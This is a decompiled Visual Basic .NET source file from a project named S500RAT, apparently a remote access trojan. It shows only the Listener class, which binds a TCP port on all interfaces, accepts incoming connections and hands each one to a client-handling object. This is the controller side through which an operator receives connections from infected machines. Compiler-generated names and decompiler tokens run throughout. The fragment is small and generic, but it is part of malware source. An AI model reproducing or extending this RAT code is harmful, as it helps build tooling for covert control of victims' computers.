Imports System
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200000E RID: 14
	Public Class Listener
		' Token: 0x17000043 RID: 67
		' (get) Token: 0x06000068 RID: 104 RVA: 0x000041D4 File Offset: 0x000023D4
		' (set) Token: 0x06000069 RID: 105 RVA: 0x000041DE File Offset: 0x000023DE
		Private Property Server As Socket

		' Token: 0x0600006A RID: 106 RVA: 0x000041E8 File Offset: 0x000023E8
		Public Async Sub Connect(port As Object)
			Dim CS$<>8__locals1 As Listener._Closure$__5-0 = New Listener._Closure$__5-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Me = Me
			CS$<>8__locals1.$VB$Local_port = port
			Await Task.Run(Sub()
				Try
					Dim localEP As IPEndPoint = New IPEndPoint(IPAddress.Any, Convert.ToInt32(RuntimeHelpers.GetObjectValue(CS$<>8__locals1.$VB$Local_port)))
					CS$<>8__locals1.$VB$Me.Server = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) With { .SendBufferSize = 51200, .ReceiveBufferSize = 51200 }
					CS$<>8__locals1.$VB$Me.Server.Bind(localEP)
					CS$<>8__locals1.$VB$Me.Server.Listen(500)
					ListLogs.AddArray(Conversions.ToString(Operators.ConcatenateObject("Listening Port : ", CS$<>8__locals1.$VB$Local_port)), 3)
					Dim num As Integer = 0
					Do
						CS$<>8__locals1.$VB$Me.Server.BeginAccept(AddressOf CS$<>8__locals1.$VB$Me.EndAccept, Nothing)
						num += 1
					Loop While num <= 10
				Catch ex As Exception
					MessageBox.Show("Listener : " + ex.Message)
					Environment.[Exit](0)
				End Try
			End Sub)
		End Sub

		' Token: 0x0600006B RID: 107 RVA: 0x00004228 File Offset: 0x00002428
		Public Async Sub EndAccept(ar As IAsyncResult)
			Await Task.Run(Sub()
				Try
					Me.Client = New Clients(Me.Server.EndAccept(ar))
				Catch ex As Exception
				Finally
					Me.Server.BeginAccept(AddressOf Me.EndAccept, Nothing)
				End Try
			End Sub)
		End Sub

		' Token: 0x04000033 RID: 51
		Public Client As Clients
	End Class
End Namespace
